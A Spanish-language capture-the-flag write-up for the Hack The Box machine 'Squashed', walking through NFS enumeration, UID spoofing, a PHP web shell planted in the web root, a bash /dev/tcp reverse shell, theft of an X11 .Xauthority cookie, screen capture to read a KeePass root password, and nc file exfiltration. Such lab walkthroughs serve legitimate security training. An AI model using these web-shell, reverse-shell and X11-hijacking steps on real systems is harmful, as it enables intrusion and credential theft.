---
title: Hack The Box Squashed
author: k4miyo
date: 2023-01-17
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [Network, Vulnerability Assessment, Common Services, Authentication, Apache, X11, NFS, Penetration Tester Level 1, Reconnaissance, User Enumeration, Impersonation, Arbitrary File Upload]
ping: true
---

## Squashed
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.11.191.

```bash
 ping -c 1 10.10.11.191
PING 10.10.11.191 (10.10.11.191) 56(84) bytes of data.
64 bytes from 10.10.11.191: icmp_seq=1 ttl=63 time=72.2 ms

--- 10.10.11.191 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 72.224/72.224/72.224/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.191 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-16 20:06 CST
Initiating SYN Stealth Scan at 20:06
Scanning 10.10.11.191 [65535 ports]
Discovered open port 111/tcp on 10.10.11.191
Discovered open port 80/tcp on 10.10.11.191
Discovered open port 22/tcp on 10.10.11.191
Discovered open port 34065/tcp on 10.10.11.191
Discovered open port 34867/tcp on 10.10.11.191
Discovered open port 2049/tcp on 10.10.11.191
Discovered open port 41605/tcp on 10.10.11.191
Discovered open port 44515/tcp on 10.10.11.191
Completed SYN Stealth Scan at 20:06, 13.21s elapsed (65535 total ports)
Nmap scan report for 10.10.11.191
Host is up, received user-set (0.074s latency).
Scanned at 2023-01-16 20:06:27 CST for 13s
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
34065/tcp open  unknown syn-ack ttl 63
34867/tcp open  unknown syn-ack ttl 63
41605/tcp open  unknown syn-ack ttl 63
44515/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
           Raw packets sent: 65568 (2.885MB) | Rcvd: 65535 (2.621MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 150 B
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.191
   5   │     [*] Open ports: 22,80,111,2049,34065,34867,41605,44515
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80,111,2049,34065,34867,41605,44515 10.10.11.191 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-16 20:08 CST
Nmap scan report for 10.10.11.191
Host is up (0.18s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34297/udp6  mountd
|   100005  1,2,3      34867/tcp   mountd
|   100005  1,2,3      39001/tcp6  mountd
|   100005  1,2,3      47027/udp   mountd
|   100021  1,3,4      34065/tcp   nlockmgr
|   100021  1,3,4      34298/udp   nlockmgr
|   100021  1,3,4      46567/tcp6  nlockmgr
|   100021  1,3,4      48136/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
34065/tcp open  nlockmgr 1-4 (RPC #100021)
34867/tcp open  mountd   1-3 (RPC #100005)
41605/tcp open  mountd   1-3 (RPC #100005)
44515/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.99 seconds
```

Antes de abrir el navegador y visitar el sitio web, vamos a ver a lo que nos enfrenamos haciendo uso de la herramienta `whatweb`:

```
❯ whatweb http://10.10.11.191/
http://10.10.11.191/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.191], JQuery[3.0.0], Script, Title[Built Better], X-UA-Compatible[IE=edge]
```

No vemos nada interesante, por lo que procedemos a visualizar el contenido vía web:

![""](/assets/images/htb-squashed/squashed1.png)

Navegando sobre el sitio web, no encontramos nada que nos llame la atención. Por lo tanto, procedemos con el siguiente puerto a enumerar que sería el 2049 (NFS); en caso de no saber como enumerar dicho servicio, podemos consultar la pagína de confianza [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting). Por lo tanto, vamos a tratar de obtener los recursos que se están compartiendo en la máquina víctima:

```
❯ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

Observamos 2 directorios, uno en `/home/ross` y otro `/var/www/html` y podría ser que tenemos un nombre de usuario a nivel de sistema, que es **ross**. Ahora procedemos a montarnos los directorios:

```
❯ mkdir /mnt/ross
❯ mkdir /mnt/web_server
❯ mount -t nfs 10.10.11.191:/home/ross /mnt/ross
❯ mount -t nfs 10.10.11.191:/var/www/html /mnt/web_server
```

Vamos a echarle un ojo al contenido de los recursos que hemos montado.

```
❯ cd /mnt/ross
❯ ll
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Desktop
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Documents
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Downloads
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Music
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Pictures
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Public
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Templates
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Videos
❯ tree
.
├── Desktop
├── Documents
│   └── Passwords.kdbx
├── Downloads
├── Music
├── Pictures
├── Public
├── Templates
└── Videos

8 directories, 1 file
```

Ojito, en la ruta `/mnt/ross/Documents/` encontramos el archivo `Passwords.kdbx`, el cual lo más seguro es que presente contraseña y no podamos hacer más.

![""](/assets/images/htb-squashed/squashed2.png)

Por lo tanto, vamos a echarle un ojo al otro recurso.

```
❯ cd web_server
cd: permission denied: web_server
```

Vemos que no tenemos acceso al contenido del posible servidor web.  Vamos a ver los permisos de los recursos:

```
❯ ll
drwxr-xr-x 1001 k4miyo   4.0 KB Sun Jan 15 17:58:04 2023  ross
drwxr-xr-- 2017 www-data 4.0 KB Mon Jan 16 20:50:01 2023  web_server
```

Tenemos que el recurso de `web_server` está asociado al usuario con id 2017; pero lo más seguro es que en nuestra máquina no tengamos un usuario con ese id; por lo tanto vamos a crearlo.

```
❯ useradd squashed
❯ usermod -u 2017 squashed
❯ groupmod -g 2017 squashed
❯ id squashed
uid=2017(squashed) gid=2017(squashed) groups=2017(squashed)
```

Vamos a migrar al usuario que creamos **squashed** y vamos a tratar de ver el contenido del recurso web.

```
❯ su squashed
$ bash
┌─[squashed@k4mipc]─[/mnt]
└──╼ $cd web_server/
┌─[squashed@k4mipc]─[/mnt/web_server]
└──╼ $ll
total 44K
drwxr-xr-x 2 squashed www-data 4.0K ene 16 20:55 css
drwxr-xr-x 2 squashed www-data 4.0K ene 16 20:55 images
-rw-r----- 1 squashed www-data  32K ene 16 20:55 index.html
drwxr-xr-x 2 squashed www-data 4.0K ene 16 20:55 js
┌─[squashed@k4mipc]─[/mnt/web_server]
└──╼ $
```

Podríamos pensar que nos encontramos dentro de la raíz del sitio web, para comprobarlo, vamos a tratar de crear un archivo txt de prueba y tratar de visualizarlo vía web.

```
┌─[squashed@k4mipc]─[/mnt/web_server]
└──╼ $echo "Esto es una prueba para validar el acceso" > test.txt
┌─[squashed@k4mipc]─[/mnt/web_server]
└──╼ $ll
total 48K
drwxr-xr-x 2 squashed www-data 4.0K ene 16 20:55 css
drwxr-xr-x 2 squashed www-data 4.0K ene 16 20:55 images
-rw-r----- 1 squashed www-data  32K ene 16 20:55 index.html
drwxr-xr-x 2 squashed www-data 4.0K ene 16 20:55 js
-rw-r--r-- 1 squashed squashed   42 ene 16 20:58 test.txt
┌─[squashed@k4mipc]─[/mnt/web_server]
└──╼ $
```

![""](/assets/images/htb-squashed/squashed3.png)

Tenemos permisos de escritura dentro de la raíz del sitio web, por lo tanto, ya debemos estar pensando en generar un archivo PHP para entablarnos una reverse shell.

```
┌─[squashed@k4mipc]─[/mnt/web_server]
└──╼ $nano cmd.php
Unable to create directory /home/squashed/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

┌─[squashed@k4mipc]─[/mnt/web_server]
└──╼ $cat cmd.php 
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
┌─[squashed@k4mipc]─[/mnt/web_server]
└──╼ $
```

![""](/assets/images/htb-squashed/squashed4.png)

Tenemos ejecución de comando a nivel de sistema, ahora si vamos a entablarnos una reverse shell

```
http://10.10.11.191/cmd.php?cmd=bash -c "bash -i >& /dev/tcp/10.10.14.17/443 0>&1"
```

```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.191] 57808
bash: cannot set terminal process group (1081): Inappropriate ioctl for device
bash: no job control in this shell
alex@squashed:/var/www/html$
```

Ya nos encontramos dentro de la máquina como el usuario **alex**. Antes de otra cosa, haremos un [Tratamiento de la tty](/posts/tratamiento-tty). Vamos a ver que encontramos en el directorio del usuario **alex**:

```
alex@squashed:/var/www/html$ cd /home/
alex@squashed:/home$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Oct 21 14:57 .
drwxr-xr-x 20 root root 4096 Oct 21 14:57 ..
drwxr-xr-x 16 alex alex 4096 Jan 17 03:06 alex
drwxr-xr-x 14 ross ross 4096 Jan 15 23:58 ross
alex@squashed:/home$
alex@squashed:/home/alex$ ls -la
total 76
drwxr-xr-x 16 alex alex 4096 Jan 17 03:06 .
drwxr-xr-x  4 root root 4096 Oct 21 14:57 ..
-rw-rw-rw-  1 alex alex   57 Jan 15 23:58 .Xauthority
lrwxrwxrwx  1 root root    9 Oct 17 13:23 .bash_history -> /dev/null
drwxr-xr-x  8 alex alex 4096 Jan 17 02:30 .cache
drwx------  8 alex alex 4096 Oct 21 14:57 .config
drwx------  3 alex alex 4096 Oct 21 14:57 .gnupg
-rw-------  1 alex alex   34 Jan 16 05:29 .lesshst
drwx------  4 alex alex 4096 Jan 16 04:56 .local
drwxr-xr-x  2 alex alex 4096 Jan 16 05:19 .ssh
lrwxrwxrwx  1 root root    9 Oct 21 13:06 .viminfo -> /dev/null
drwxr-xr-x  2 alex alex 4096 Oct 21 14:57 Desktop
drwxr-xr-x  2 alex alex 4096 Oct 21 14:57 Documents
drwxr-xr-x  2 alex alex 4096 Oct 21 14:57 Downloads
drwxr-xr-x  2 alex alex 4096 Oct 21 14:57 Music
drwxr-xr-x  2 alex alex 4096 Oct 21 14:57 Pictures
drwxr-xr-x  2 alex alex 4096 Oct 21 14:57 Public
drwxr-xr-x  2 alex alex 4096 Oct 21 14:57 Templates
drwxr-xr-x  2 alex alex 4096 Oct 21 14:57 Videos
drwx------  3 alex alex 4096 Oct 21 14:57 snap
-rw-r-----  1 root alex   33 Jan 15 23:58 user.txt
alex@squashed:/home/alex$
```

Encontramos la primera flag que es user.txt. Ahora debemos de encontrar una forma de escalar privilegios; recordando, tenemos acceso al directorio HOME del usuario **ross** a través de la montura y a través de una reverse shell tenemos acceso como el usuario **alex**. Revisando el directorio del usaurio **ross**, vemos el archivo `.Xauthority`:

```
❯ cd ross
❯ tree
.
├── Desktop
├── Documents
│   └── Passwords.kdbx
├── Downloads
├── Music
├── Pictures
├── Public
├── Templates
└── Videos

8 directories, 1 file
❯ ls -la
drwxr-xr-x 1001 k4miyo 4.0 KB Sun Jan 15 17:58:04 2023  .
drwxr-xr-x root root    28 B  Mon Jan 16 20:35:47 2023  ..
drwx------ 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  .cache
drwx------ 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  .config
drwx------ 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  .gnupg
drwx------ 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  .local
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Desktop
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Documents
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Downloads
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Music
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Pictures
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Public
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Templates
drwxr-xr-x 1001 k4miyo 4.0 KB Fri Oct 21 09:57:01 2022  Videos
lrwxrwxrwx root root     9 B  Thu Oct 20 08:24:01 2022  .bash_history ⇒ /dev/null
lrwxrwxrwx root root     9 B  Fri Oct 21 08:07:10 2022  .viminfo ⇒ /dev/null
.rw------- 1001 k4miyo  57 B  Sun Jan 15 17:58:04 2023  .Xauthority
.rw------- 1001 k4miyo 2.4 KB Sun Jan 15 17:58:05 2023  .xsession-errors
.rw------- 1001 k4miyo 2.4 KB Tue Dec 27 09:33:41 2022  .xsession-errors.old
```

Si lo intentamos visualizar, nos enviara un error de permisos.

```
❯ cat .Xauthority
[bat error]: '.Xauthority': Permission denied (os error 13)
```

Por lo tanto, es necesario contar con un usuario que tenga el id 1001 en nuestra máquina de atacante.

```
❯ useradd squashed2
❯ usermod -u 1001 squashed2
❯ ls -la .Xauthority
.rw------- squashed2 k4miyo 57 B Sun Jan 15 17:58:04 2023  .Xauthority
❯ su squashed2
$ bash
┌─[squashed2@k4mipc]─[/mnt/ross]
└──╼ $cat .Xauthority; echo

squashed.htb0MIT-MAGIC-COOKIE-1l xŮ\[ls
┌─[squashed2@k4mipc]─[/mnt/ross]
└──╼ $
```

Ahora es necesario pasar el archivo `.Xauthority` al usuario **alex**, por lo tanto nos montamos un servidor HTTP con python:

```
┌─[squashed2@k4mipc]─[/mnt/ross]
└──╼ $python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.191 - - [16/Jan/2023 21:35:30] "GET /.Xauthority HTTP/1.1" 200 -
```

```
alex@squashed:/home/alex$ wget http://10.10.14.17:8080/.Xauthority
--2023-01-17 03:35:28--  http://10.10.14.17:8080/.Xauthority
Connecting to 10.10.14.17:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 57 [application/octet-stream]
Saving to: '.Xauthority.1'

.Xauthority.1                                  100%[====================================================================================================>]      57  --.-KB/s    in 0.07s   

2023-01-17 03:35:29 (800 B/s) - '.Xauthority.1' saved [57/57]

alex@squashed:/home/alex$
```

Ahora vamos a validar si el usuario **ross** tiene una sesión:

```
alex@squashed:/home/alex$ w
 03:36:28 up 1 day,  3:38,  1 user,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               Sun23   27:38m  3:39   0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
alex@squashed:/home/alex$
```

Y vemos que si en `:0`; por lo tanto, haciendo uso de la página de confianza [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11), vamos a validar la conexión:

```
alex@squashed:~$ xdpyinfo -display :0                                                                                                                                                       
name of display:    :0                                                                                                                                                                      
version number:    11.0                                                                                                                                                                     
vendor string:    The X.Org Foundation                                                                                                                                                      
vendor release number:    12013000                                                                                                                                                          
X.Org version: 1.20.13                                                                                                                                                                      
maximum request size:  16777212 bytes                                                                                                                                                       
motion buffer size:  256                                                                                                                                                                    
bitmap unit, bit order, padding:    32, LSBFirst, 32                                                                                                                                        
image byte order:    LSBFirst                                                                                                                                                               
number of supported pixmap formats:    7                                                                                                                                                    
supported pixmap formats:                                                                                                                                                                   
    depth 1, bits_per_pixel 1, scanline_pad 32                                                                                                                                              
    depth 4, bits_per_pixel 8, scanline_pad 32                                                                                                                                              
    depth 8, bits_per_pixel 8, scanline_pad 32                                                                                                                                              
    depth 15, bits_per_pixel 16, scanline_pad 32                                                                                                                                            
    depth 16, bits_per_pixel 16, scanline_pad 32                                                                                                                                            
    depth 24, bits_per_pixel 32, scanline_pad 32                                                                                                                                            
    depth 32, bits_per_pixel 32, scanline_pad 32                                                                                                                                            
keycode range:    minimum 8, maximum 255
...
  visual:
    visual id:    0x531
    class:    TrueColor
    depth:    32 planes
    available colormap entries:    256 per subfield
    red, green, blue masks:    0xff0000, 0xff00, 0xff
    significant bits in color specification:    8 bits
alex@squashed:~$
```

```
alex@squashed:~$ xwininfo -root -tree -display :0

xwininfo: Window id: 0x533 (the root window) (has no name)

  Root window id: 0x533 (the root window) (has no name)
  Parent window id: 0x0 (none)
     26 children:
     0x80000b "gnome-shell": ("gnome-shell" "Gnome-shell")  1x1+-200+-200  +-200+-200
        1 child:
        0x80000c (has no name): ()  1x1+-1+-1  +-201+-201
     0x800022 (has no name): ()  802x575+-1+26  +-1+26
        1 child:
        0x1e00006 "Passwords - KeePassXC": ("keepassxc" "keepassxc")  800x536+1+38  +0+64
           1 child:
           0x1e000fe "Qt NET_WM User Time Window": ()  1x1+-1+-1  +-1+63
     0x1e00008 "Qt Client Leader Window": ()  1x1+0+0  +0+0
     0x2000001 "keepassxc": ("keepassxc" "Keepassxc")  10x10+10+10  +10+10
     0x1e00004 "Qt Selection Owner for keepassxc": ()  3x3+0+0  +0+0
     0x1c00001 "evolution-alarm-notify": ("evolution-alarm-notify" "Evolution-alarm-notify")  10x10+10+10  +10+10
     0x800017 (has no name): ()  1x1+-1+-1  +-1+-1
     0x1a00002 (has no name): ()  10x10+0+0  +0+0
     0x1a00001 "gsd-xsettings": ("gsd-xsettings" "Gsd-xsettings")  10x10+10+10  +10+10
     0x1600001 "gsd-wacom": ("gsd-wacom" "Gsd-wacom")  10x10+10+10  +10+10
     0x1800001 "gsd-media-keys": ("gsd-media-keys" "Gsd-media-keys")  10x10+10+10  +10+10
     0x1000001 "gsd-power": ("gsd-power" "Gsd-power")  10x10+10+10  +10+10
     0x1200001 "gsd-keyboard": ("gsd-keyboard" "Gsd-keyboard")  10x10+10+10  +10+10
     0x1400001 "gsd-color": ("gsd-color" "Gsd-color")  10x10+10+10  +10+10
     0xc00003 "ibus-xim": ()  1x1+0+0  +0+0
        1 child:
        0xc00004 (has no name): ()  1x1+-1+-1  +-1+-1
     0xc00001 "ibus-x11": ("ibus-x11" "Ibus-x11")  10x10+10+10  +10+10
     0xa00001 "ibus-extension-gtk3": ("ibus-extension-gtk3" "Ibus-extension-gtk3")  10x10+10+10  +10+10
     0x800011 (has no name): ()  1x1+-100+-100  +-100+-100
     0x80000f (has no name): ()  1x1+-1+-1  +-1+-1
     0x800009 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800008 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800007 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800006 "GNOME Shell": ()  1x1+-100+-100  +-100+-100
     0x800001 "gnome-shell": ("gnome-shell" "Gnome-shell")  10x10+10+10  +10+10
     0x600008 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800010 "mutter guard window": ()  800x600+0+0  +0+0

alex@squashed:~$
```

Vemos que con el comando `xwininfo` vemos algo de Keepass y recordamos que tenemos el archivo `Passwords.kdbx`; por lo que nos hace pensar que es posible que el usuario tenga abierto el Keepass y podemos visualizar el contenido de dicho archivo. Por lo tanto, vamos a tomar una captura :

```
alex@squashed:~$ xwd -root -screen -silent -display :0 > screenshot.xwd
alex@squashed:~$ ls -la
total 1960
drwxr-xr-x 16 alex alex    4096 Jan 17 03:49 .
drwxr-xr-x  4 root root    4096 Oct 21 14:57 ..
-rw-rw-rw-  1 alex alex      57 Jan 15 23:58 .Xauthority
-rw-r--r--  1 alex alex      57 Jan 15 23:58 .Xauthority.1
lrwxrwxrwx  1 root root       9 Oct 17 13:23 .bash_history -> /dev/null
drwxr-xr-x  8 alex alex    4096 Jan 17 02:30 .cache
drwx------  8 alex alex    4096 Oct 21 14:57 .config
drwx------  3 alex alex    4096 Oct 21 14:57 .gnupg
-rw-------  1 alex alex      34 Jan 16 05:29 .lesshst
drwx------  4 alex alex    4096 Jan 16 04:56 .local
drwxr-xr-x  2 alex alex    4096 Jan 16 05:19 .ssh
lrwxrwxrwx  1 root root       9 Oct 21 13:06 .viminfo -> /dev/null
drwxr-xr-x  2 alex alex    4096 Oct 21 14:57 Desktop
drwxr-xr-x  2 alex alex    4096 Oct 21 14:57 Documents
drwxr-xr-x  2 alex alex    4096 Oct 21 14:57 Downloads
drwxr-xr-x  2 alex alex    4096 Oct 21 14:57 Music
drwxr-xr-x  2 alex alex    4096 Oct 21 14:57 Pictures
drwxr-xr-x  2 alex alex    4096 Oct 21 14:57 Public
drwxr-xr-x  2 alex alex    4096 Oct 21 14:57 Templates
drwxr-xr-x  2 alex alex    4096 Oct 21 14:57 Videos
-rw-r--r--  1 alex alex 1923179 Jan 17 03:49 screenshot.xwd
drwx------  3 alex alex    4096 Oct 21 14:57 snap
-rw-r-----  1 root alex      33 Jan 15 23:58 user.txt
alex@squashed:~$
```

Vamos a pasarnos el archivo creado.

```
alex@squashed:~$ nc 10.10.14.17 8080 < screenshot.xwd 
alex@squashed:~$
```

```
❯ nc -nlvp 8080 > screenshot.xwd
listening on [any] 8080 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.191] 50478
^C
```

En nuestro equipo vamos a convertir el archivo a formato png.

```
❯ ll
.rw-r--r-- root root 1.3 KB Mon Jan 16 20:41:22 2023  Passwords.kdbx
.rw-r--r-- root root 1.8 MB Mon Jan 16 21:52:30 2023  screenshot.xwd
❯ file screenshot.xwd
screenshot.xwd: XWD X Window Dump image data, "xwdump", 800x600x24
❯ convert screenshot.xwd screenshot.png
❯ ll
.rw-r--r-- root root 1.3 KB Mon Jan 16 20:41:22 2023  Passwords.kdbx
.rw-r--r-- root root  44 KB Mon Jan 16 21:53:54 2023  screenshot.png
.rw-r--r-- root root 1.8 MB Mon Jan 16 21:52:30 2023  screenshot.xwd
```

Ahora si podemos ver el screenshot tomado.

![""](/assets/images/htb-squashed/squashed5.png)

Tenemos la contraseña del usuario **root** que es ***cah$mei7rai9A***. Por lo tanto, podemos migrar al usuario **root** y visualizar el contenido de la flag root.txt.
